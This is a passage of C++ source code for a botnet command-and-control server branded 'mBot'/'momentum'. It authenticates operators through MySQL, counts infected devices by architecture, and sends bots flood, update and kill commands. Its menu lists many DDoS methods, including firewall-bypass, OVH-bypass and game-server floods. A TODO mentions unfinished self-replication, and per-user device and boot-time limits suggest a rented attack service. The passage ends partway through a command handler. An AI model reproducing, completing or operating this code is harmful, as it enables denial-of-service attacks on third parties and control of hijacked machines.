#include <iostream>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <thread>
#include <map>
#include <sstream>
#include <string>
#include <unistd.h>
#include <sys/epoll.h>
#include <errno.h>
#include <string.h>
#include <vector>
#include <iterator>
#include <sys/time.h>
#include <ctime>
#include <chrono>

#include "headers/main.h"
#include "headers/client.h"
#include "headers/mysql.h"
#include "headers/command.h"
#include "headers/thread.h"

/* Features to be done:
 - total bots retrieving list (ip, core_count, arch, build_id)
 - fix the bot-update
 - finish the selfrep 
 - add attacks slots limit (memory)
 - *a momentum production, badwolf & cisco 
 */

static volatile int ConnectedUser = 0;
static volatile int available_slots = 10;
static int global_attack_status = TRUE;

static volatile int running_attack_count = 0;
static volatile int slot_used = 0;

int running_attack = FALSE;
int running_attack_time = time(NULL);
int running_attack_time_elapsed = 0;
int running_additional_timeout = 0;

static void *admin_timeout_thread(void *arg)
{
    struct thread_data *tdata = (struct thread_data *)arg;

    pthread_barrier_wait(tdata->barrier);

    while(TRUE)
    {
        if(tdata->time + tdata->timeout < time(NULL))
        {
            close(tdata->fd);
            pthread_cancel(*tdata->admin_thread);
            break;
        }
        sleep(1);
    }

    pthread_exit(0);
}

static void terminate_client(int fd)
{
    if (client_list[fd].arch_len > 1)
        printf("\e[95m[-]\e[37m Connection terminated. (%d.%d.%d.%d) (%s)\n", client_list[fd].addr & 0xff, (client_list[fd].addr >> 8) & 0xff, (client_list[fd].addr >> 16) & 0xff, (client_list[fd].addr >> 24) & 0xff, client_list[fd].arch);

    epoll_ctl(efd, EPOLL_CTL_DEL, client_list[fd].fd, NULL);

    if(client_list[fd].fd != -1)
        close(client_list[fd].fd);

    client_list[fd].fd = -1;
    client_list[fd].connected = FALSE;
    client_list[fd].addr = 0;
    client_list[fd].authenticated = FALSE;
    client_list[fd].timeout = 0;
    client_list[fd].arch_len = 0;
    memset(client_list[fd].arch, 0, sizeof(client_list[fd].arch));

    return;
}

static void _exit(const char *str, int exit_code)
{
    std::cout << str << std::endl;
    exit(exit_code);
}

static void admin_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    admin_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!admin_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ADMIN_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(admin_fd);
    REUSE_ADDR(admin_fd);

    ret = bind(admin_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("\e[031mFailed to bind to the admin port\e[037m", 1);
    }

    ret = listen(admin_fd, 0);
    if(ret)
    {
        _exit("\e[031mFailed to listen on the admin port\e[037m", 1);
    }

    return;
}

static void delete_dup(int fd)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_KILL;
    send(fd, &data, sizeof(data), MSG_NOSIGNAL);
    return;
}


static void accept_client_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    struct epoll_event e;
    int ret = 0;
    int count = 0;
    struct process process;
    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    }
    e.data.fd = fd;
    e.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &e);
    if(ret)
    {
        return;
    }
    client_list[e.data.fd].addr = addr.sin_addr.s_addr;
    client_list[e.data.fd].fd = e.data.fd;
    for (count = 0; count < MAX_BOTS; count++)
    {
        if(!client_list[count].connected || count == e.data.fd)
        {
            continue;
        }
        if(client_list[count].addr == client_list[e.data.fd].addr) //check if ip are already auth / logged in the port
        {
            //printf("\033[37m[\033[33m~\033[37m] (\033[33m%d\033[37m.\033[33m%d\033[37m.\033[33m%d\033[37m.\033[33m%d\033[37m) removed due to duplicate ip\033[33m!\033[0m\n", client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff);
            //delete_dup(client_list[e.data.fd].fd); //kick them
            client_list[e.data.fd].fd = -1;
            break;
        }
    }
    if(client_list[e.data.fd].fd == -1)
    {
        return;
    }
    client_list[e.data.fd].connected = TRUE;
    client_list[e.data.fd].authenticated = FALSE;
    client_list[e.data.fd].timeout = time(NULL);
    client_list[e.data.fd].arch_len = 0;
    memset(client_list[e.data.fd].arch, 0, sizeof(client_list[e.data.fd].arch));
    //printf("\033[37m[\033[32m+\033[37m] (\033[32m%d\033[37m.\033[32m%d\033[37m.\033[32m%d\033[37m.\033[32m%d\033[37m) Connection accepted\033[32m!\033[0m\n", client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff);
    return;
}

static void trim(char *str)
{
    int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
        begin++;

    while ((end >= begin) && isspace(str[end]))
        end--;

    for (i = begin; i <= end; i++)
        str[i - begin] = str[i];

    str[i - begin] = '\0';
}

static int parse_count(struct process *process)
{
    int count = 0;
    int x = 0;
    std::stringstream stream;
    std::string out;
    std::string n;

    stream << process->buf;

    std::getline(stream, out, ' ');
    n = out;

    process->f = process->buf;
    process->f.erase(0, n.length() + 1);

    n.erase(0, 1);

    count = stoi(n);

    if(count == 0 || (process->ptr->max_clients == -1 && count == -1) || (process->ptr->max_clients != -1 && count > process->ptr->max_clients))
        return 0;

    process->count = count;
    return 1;
}

static void flood(struct command *ptr, struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;

    data.type = TYPE_FLOOD;

    memset(data.buf, 0, sizeof(data.buf));

    memcpy(data.buf, ptr->buf, ptr->buf_len);

    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
            continue;
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
            break;
    }

    return;
}


static void *flood_timeout(void *arg)
{
    while (TRUE)
    {
        if (!running_attack && running_attack_time <= 0 || available_slots <= 1)
        {
            sleep(1);
            continue;
        }

        if (running_attack_time + FLOOD_TIMEOUT + running_additional_timeout <= time(NULL))
        {
            // Global cooldown has ended...
            running_attack = FALSE;
            running_attack_time = 0;
            running_attack_time_elapsed = 0;
            running_additional_timeout = 0;
            continue;
        }

        if(running_attack_time + FLOOD_TIMEOUT + running_additional_timeout >= time(NULL) && available_slots == 1)
        {
            running_attack = FALSE;
            available_slots = 2;
        }

        running_attack = TRUE;
        running_attack_time_elapsed++;
        sleep(1);
    }

    return nullptr;
}

static std::map<std::string, int> statistics(void)
{
    int i = 0;
    std::map<std::string, int> t;

    for(i = 0; i < MAX_BOTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        t[client_list[i].arch]++;
    }

    return t;
}

int client_count(int max_clients)
{
    int i = 0;
    int x = 0;

    for(i = 0; i < MAX_BOTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        if(max_clients != -1 && x == max_clients)
            break;
        x++;
    }

    return x;
}


void *title_counter(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;

    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);
  
        title << "\033]0;";
        title << "" << client_count(p.max_clients) <<" Bots | " << ConnectedUser <<" Users";
        title << " | "<< slot_used <<"/" << available_slots << "";
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
    }
}

static std::vector<std::string> split(const std::string& s, char delimiter)
{
    std::vector<std::string> tokens;
    std::string token;
    std::istringstream tokenStream(s);
    while (std::getline(tokenStream, token, delimiter))
    {
        tokens.push_back(token);
    }

    return tokens;
}

static std::tuple<int, std::string> recv_line(int fd)
{
    int ret = 0;
    std::string str;

    while(1)
    {
        int np = 0;
        int rp = 0;
        char out[4096];

        memset(out, 0, sizeof(out));

        ret = recv(fd, out, sizeof(out), MSG_NOSIGNAL);
        if(ret <= 0)
        {
            return std::tuple<int, std::string>(ret, str);
        }

        str = out;

        np = str.find("\n");
        rp = str.find("\r");

        if(np != -1)
        {
            str.erase(np);
        }

        if(rp != -1)
        {
            str.erase(rp);
        }

        if(str.length() == 0)
        {
            continue;
        }

        break;
    }

    return std::tuple<int, std::string>(ret, str);
}

static void kill_self(struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_KILL;
    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}


static void update_bots(struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_UPDATE;
    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}



static void *admin(void *arg)
{
    int fd = -1;
    std::stringstream stream;
    pthread_t counter;
    char user[4096];
    char pass[4096];
    char banner1[1024];
    char banner2[1024];
    char banner3[1024];
    char banner4[1024];
    char banner5[1024];
    char banner6[1024];
    char banner7[1024];
    char master[1024];
    struct admin login;
    int load = 0;
    struct thread_data *tdata = (struct thread_data *)arg;
    struct thread_data t;
    pthread_barrier_t barrier;
    pthread_t admin_timeout;
    int ex = 0;
    int ret = 0;
    std::string banner;
    int np = 0;
    int rp = 0;
    std::tuple<int, std::string> line;

    pthread_barrier_wait(tdata->barrier);

    fd = tdata->fd;

    pthread_barrier_init(&barrier, NULL, 1);

    t.fd = fd;
    t.time = time(NULL);
    t.barrier = &barrier;
    t.admin_thread = tdata->admin_thread;
    t.timeout = 60;

    pthread_create(&admin_timeout, NULL, admin_timeout_thread, (void *)&t);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    line = recv_line(fd);

    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);

    if(strcmp(std::get<std::string>(line).c_str(), MANAGER_AUTH_KEY))
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    send(fd, "\e[93mConnection accepted!\r\n", strlen("\e[93mConnection accepted!\r\n"), MSG_NOSIGNAL); 
    sleep(2);   
    send(fd, "\e[37m[\e[32m!\e[37m] \e[95mWelcome into the mBot \e[37m[\e[32m!\e[37m]\r\n", strlen("\e[37m[\e[32m!\e[37m] \e[95mWelcome into the mBot \e[37m[\e[32m!\e[37m]\r\n"), MSG_NOSIGNAL);    
    send(fd, "\e[95m┌──\e[37mPlease enter your username below\r\n\e[95m└─\e[37m$ ", strlen("\e[95m┌──\e[37mPlease enter your username below\r\n\e[95m└─\e[37m$ "), MSG_NOSIGNAL);

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(user, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());
    send(fd, "\e[95m┌──\e[37mPlease enter your password below\r\n\e[95m└─\e[37m$ ", strlen("\e[95m┌──\e[37mPlease enter your password below\r\n\e[95m└─\e[37m$ "), MSG_NOSIGNAL);


    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(pass, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    login.user_ptr = user;
    login.pass_ptr = pass;
    pthread_cancel(counter);
    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);
    send(fd, "\e[37mChecking your credentials", strlen("\e[37mChecking your credentials"), MSG_NOSIGNAL);
    for(load = 0; load < 3; load++)
    {
        send(fd, "\e[95m.\e[0m", strlen("\e[95m.\e[0m"), MSG_NOSIGNAL);
        sleep(1);
    }
    if(!mysql_login(&login))
    {
        send(fd, "\r\n\e[91mGoodbye goofy!\e[0m\r\n", strlen("\r\n\e[91mGoodbye goofy!\e[0m\r\n"), MSG_NOSIGNAL);
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    pthread_cancel(admin_timeout);

    login.fd = fd;

    mysql_set_restrictions(&login);

    if(login.authenticated)
    {
        send(fd, "\r\n\e[95mYou are already logged on the net\e[95m!\e[0m\r\n", strlen("\r\n\e[93mYou are already logged on the net\e[95m!\e[0m\r\n"), MSG_NOSIGNAL);
        close(fd);
        pthread_exit(0);
    }

    mysql_update_login(&login, 1);
    ConnectedUser++;
    // User has been disabled for a indefinite amount of time
    if(login.disable)
    {
        send(fd, "\e[37m[\e[91m!\e[37m] \e[91mYOUR ACCOUNT WAS DISABLED BY ADMIN \e[37m[\e[91m!\e[37m]\r\n", strlen("\e[37m[\e[91m!\e[37m] \e[91mYOUR ACCOUNT WAS DISABLED BY ADMIN \e[37m[\e[91m!\e[37m]\r\n"), MSG_NOSIGNAL);
        pthread_exit(0);
    }
    pthread_cancel(counter);

      if(global_attack_status == FALSE)
        {
      pthread_cancel(counter);
      pthread_create(&counter, NULL, title_counter, (void *)&login);
      send(fd, "\033[2J\033[H\e[37m[\e[32m!\e[37m] \e[32mConnection established to the mBot Network \e[37m[\e[32m!\e[37m]\e[0m\r\n", strlen("\033[2J\033[H\e[37m[\e[32m!\e[37m] \e[32mConnection established to the mBot Network \e[37m[\e[32m!\e[37m]\e[0m\r\n"), MSG_NOSIGNAL);
      send(fd, "\e[37mStatus of attack: \e[95mdisabled\r\n", strlen("\e[37mStatus of attack: \e[95mdisabled\r\n"), MSG_NOSIGNAL);
      send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
      send(fd, "\r\n\r\n", 4, MSG_NOSIGNAL);
        } 

      if(global_attack_status == TRUE)
        {
      pthread_cancel(counter);
      pthread_create(&counter, NULL, title_counter, (void *)&login);
      send(fd, "\033[2J\033[H\e[37m[\e[32m!\e[37m] \e[32mConnection established to the mBot Network \e[37m[\e[32m!\e[37m]\e[0m\r\n", strlen("\033[2J\033[H\e[37m[\e[32m!\e[37m] \e[32mConnection established to the mBot Network \e[37m[\e[32m!\e[37m]\e[0m\r\n"), MSG_NOSIGNAL);
      send(fd, "\e[37mStatus of attack: \e[32menabled\r\n", strlen("\e[37mStatus of attack: \e[32menabled\r\n"), MSG_NOSIGNAL);
      send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
      send(fd, "\r\n\r\n", 4, MSG_NOSIGNAL);
        } 

      stream << "\r\e[37m"<< login.username <<"\e[35m@\e[37mmomentum#\e[0m ";

      // Spawn a thread to update a active title counter

    while(TRUE)
    {
        char buf[4096];
        struct process process;
        struct command *ptr;
        int x = 0;
        std::string data;
        int g = 0;
        int count = 0;
        int cooldown = 0;
        int concurrent_user = 0;
        int maxclikos = 0;
        int time_boot = 0;
        int np = 0;
        int rp = 0;

        memset(buf, 0, sizeof(buf));

        // Send the admin a fake prompt for user input
        ret = send(fd, stream.str().c_str(), stream.str().length(), MSG_NOSIGNAL);

        if(ret <= 0)
        {
            break;
        }

        g = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);

        if(g <= 0)
        {
            break;
        }

        data = buf;

        np = data.find("\n");
        rp = data.find("\r");

        if(np != -1)
        {
            data.erase(np);
        }

        if(rp != -1)
        {
            data.erase(rp);
        }

        if(data == "")
        {
            continue;
        }

        mysql_set_restrictions(&login);
        count = client_count(login.max_clients);
        concurrent_user = login.concurrent;
        cooldown = login.cooldown;
        maxclikos = login.max_clients;
        time_boot = login.max_time;


        if(data == "methods" || data == "?")
        {
            send(fd, "\033[2J\033[H\r\n\e[95mCommand usage: \e[37m![method] [ip] [time] port=[port]\r\n\r\n", strlen("\033[2J\033[H\r\n\e[95mCommand usage: \e[37m![method] [ip] [time] port=[port]\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !udp: \e[37mgeneric udp flood\r\n", strlen("\e[95m  !udp: \e[37mgeneric udp flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !udpbypass: \e[37mudp flood custom for bypassing firewall rules\r\n", strlen("\e[95m  !udpbypass: \e[37mudp flood custom for bypassing firewall rules\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !voltudp: \e[37mudp flood optimized for more pps\r\n\r\n", strlen("\e[95m  !voltudp: \e[37mudp flood optimized for more pps\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !ack: \e[37mtcp ack flood\r\n", strlen("\e[95m  !ack: \e[37mtcp ack flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !syn: \e[37mtcp syn flood\r\n", strlen("\e[95m  !syn: \e[37mtcp syn flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !tcpovh: \e[37mtcp flood custom for bypassing ovh headers\r\n", strlen("\e[95m  !tcpovh: \e[37mtcp flood custom for bypassing ovh headers\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !burstcp: \e[37mACK optimized for high PPS.\r\n\r\n", strlen("\e[95m  !tcpburst: \e[37mACK optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !udpvse: \e[37mvalve source engine flood\r\n", strlen("\e[95m  !udpvse: \e[37mvalve source engine flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !udpfivem: \e[37mudp flood custom for bypassing fivem\r\n", strlen("\e[95m  !udpfivem: \e[37mudp flood custom for bypassing fivem\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !hex: \e[37mudp flood custom udp flood with hex packet\r\n", strlen("\e[95m  !hex: \e[37mudp flood custom udp flood with hex packet\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !tcpcookie: \e[37mtcp flood cookie spam session\r\n", strlen("\e[95m  !tcpcookie: \e[37mtcp flood cookie spam session\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !tcpmix: \e[37mtcp flood custom with multi flags\r\n\r\n", strlen("\e[95m  !tcpmix: \e[37mtcp flood custom with multi flags\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !protocol: \e[37mrandom protocol flood\r\n", strlen("\e[95m  !protocol: \e[37mrandom protocol flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !esp: \e[37mesp layer3 flood\r\n", strlen("\e[95m  !esp: \e[37mesp layer3 flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[95m  !ethernet: \e[37mcustom ethernet layer flood\r\n\r\n", strlen("\e[0m  !ethernet: \e[37mcustom ethernet layer flood\r\n\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "help")
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);

            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

            send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
            send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
            send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
            send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
            send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
            send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
            send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[95m-\e[37m Help Menu \e[95m-\r\n", strlen("\e[95m-\e[37m Help Menu \e[95m-\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[95mstatistics:\e[37m Check your account informations.\r\n", strlen("   \e[95mstatistics:\e[37m Check your account informations.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[95mbots/os:\e[37m Show the bots architechture\r\n", strlen("   \e[95mbots/os:\e[37m Show the bots architechture\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[95mmethods/?:\e[37m Show all methods currently available.\r\n", strlen("   \e[95mmethods/?:\e[37m Show all methods currently available.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[95mclear/cls:\e[37m Clear the screen.\r\n", strlen("   \e[95mclear/cls:\e[37m Clear the screen.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[95mquit:\e[37m Leave the network.\r\n", strlen("   \e[95mquit:\e[37m Leave the network.\r\n"), MSG_NOSIGNAL);
            if(login.admin == 1){
                send(fd, "\r\n\e[95m- \e[37mAdmin Options \e[95m-\r\n", strlen("\r\n\e[95m- \e[37mAdmin Options \e[95m-\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[95mattacks <enable/disable>:\e[37m Enable/disable attacks on the network.\r\n", strlen("   \e[95mattacks <enable/disable>:\e[37m Enable/disable attacks on the network.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[95mupdate:\e[37m Update the bots with new bins.\r\n", strlen("   \e[95mupdate:\e[37m Update the bots with new bins.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[95mbotkill:\e[37m Kill all bots currently connected.\r\n", strlen("   \e[95mbotkill:\e[37m Kill all bots currently connected.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[95madmin:\e[37m Admin control panel.\r\n", strlen("   \e[95madmin:\e[37m Admin control panel.\r\n"), MSG_NOSIGNAL);

            }
            continue;
        }


                if((data == "statistics") && login.admin == 0)
                {

                    std::stringstream mystats_stream;
                    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

            send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
            send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
            send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
            send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
            send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
            send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
            send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);

            mystats_stream << "\r\n\e[38mUsername: \e[37m" << login.username;
            mystats_stream << "\r\n\e[38mRank: \e[37mClients"; 
            mystats_stream << "\r\n\e[38mDevices online: \e[37m" << count;
            mystats_stream << "\r\n\e[38mDevices allowed: \e[37m " << maxclikos; 
            mystats_stream << "\r\n\e[38mConcurrent allowed: \e[37m" << concurrent_user; 
            mystats_stream << "\r\n\e[38mCooldown:\e[37m " << cooldown; 
            mystats_stream << "\r\n\e[38mMax boot time:\e[37m " << time_boot; 
            mystats_stream << "\r\n\r\n"; 
            send(fd, mystats_stream.str().c_str(), mystats_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if(data == "quit")
        {
            send(fd, "\r\n\e[91mGoodbye goofy!\e[0m\r\n", strlen("\r\n\e[91mGoodbye goofy!\e[0m\r\n"), MSG_NOSIGNAL);
            sleep(0.5);
            close(fd);
        }

                if((data == "statistics") && login.admin == 1)
                {

                    std::stringstream mystats_stream;
                    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                        send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                        send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                        send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                        send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                        send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                        send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                        send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);

            mystats_stream << "\r\n\e[38mUsername: \e[37m" << login.username;
            mystats_stream << "\r\n\e[38mRank: \e[37mClients"; 
            mystats_stream << "\r\n\e[38mDevices online: \e[37m" << count;
            mystats_stream << "\r\n\e[38mDevices allowed: \e[37m " << maxclikos; 
            mystats_stream << "\r\n\e[38mConcurrent allowed: \e[37m" << concurrent_user; 
            mystats_stream << "\r\n\e[38mCooldown:\e[37m " << cooldown; 
            mystats_stream << "\r\n\e[38mMax boot time:\e[37m " << time_boot;
                        mystats_stream << "\r\n\r\n"; 
                        send(fd, mystats_stream.str().c_str(), mystats_stream.str().length(), MSG_NOSIGNAL);
                        continue;
        }

                //Start Update
                if(data == "update" && login.admin == 1 && count > 0)
                {                        
                                send(fd, "\033[37mBots updated successfuly\r\n", strlen("\033[37mBots updated successfuly\r\n"), MSG_NOSIGNAL);
                                update_bots(&process);
                                continue;
                }

                if(data == "update" && login.admin == 1 && count == 0)
                {
                                send(fd, "\033[37mImpossible to update.\r\n", strlen("\033[37mImpossible to update.\r\n"), MSG_NOSIGNAL);
                                continue;
                }
                if(data == "update" && login.admin == 0)
                {
                                continue;
                }
                //End Update

                //Start BOTKILL
                if(data == "botkill" && login.admin == 1 && count > 0)
                {                        
                                send(fd, "\033[37mKilling all current running processes\033[38;5;220m!\r\n", strlen("\033[37mKilling all current running processes\033[38;5;220m!\r\n"), MSG_NOSIGNAL);
                                kill_self(&process);
                                continue;
                }
                if(data == "botkill" && login.admin == 1 && count == 0)
                {
                                send(fd, "\033[37mImpossible to kill.\r\n", strlen("\033[37mImpossible to kill.\r\n"), MSG_NOSIGNAL);
                                continue;
                }
                if(data == "botkill" && login.admin == 0)
                {
                                continue;
                }
                //End BOTKILL

                if(data == "bots")
                {
                    std::stringstream count_stream;

                    count_stream << "\e[95mAvailable devices\e[0m\e[37m: " << count;
                    count_stream << "\r\n\e[95mMaximum allowed devices\e[0m\e[37m: " << maxclikos;

                    count_stream << "\r\n";

                    send(fd, count_stream.str().c_str(), count_stream.str().length(), MSG_NOSIGNAL);
                    continue;
                }

                if(data == "mastercls") 
                {
                    send(fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"), MSG_NOSIGNAL);
                    continue;
                }

        if(data == "clear" || data == "cls") 
        {
